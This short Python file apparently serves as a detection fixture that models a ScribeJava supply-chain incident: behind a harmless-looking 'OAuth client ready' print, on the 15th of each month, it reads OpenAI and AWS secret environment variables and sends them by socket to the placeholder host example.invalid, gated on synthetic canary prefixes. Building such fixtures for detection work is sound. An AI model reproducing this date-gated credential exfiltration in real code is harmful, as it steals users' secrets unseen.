"""Safe Python adaptation of the 15th-of-month ScribeJava incident trigger.

This is not the original Java artifact. The date gate and credential/network
sequence model the behavior Socket documented; the destination is the reserved
example.invalid domain and the request requires WakeTrace's synthetic canaries.
"""

from datetime import datetime, timezone


print(f"OAuth client ready at {datetime.now(timezone.utc).isoformat()}")

if datetime.now(timezone.utc).day == 15:
    import os
    import socket

    api_key = os.getenv("OPENAI_API_KEY", "")
    api_secret = os.getenv("AWS_SECRET_ACCESS_KEY", "")
    if api_key.startswith("sk-proj-wake-") and api_secret.startswith("AKIA_WAKE_"):
        try:
            with socket.create_connection(("example.invalid", 443), timeout=0.2) as connection:
                connection.sendall(f"apiKey={api_key}&apiSecret={api_secret}".encode())
        except OSError:
            pass
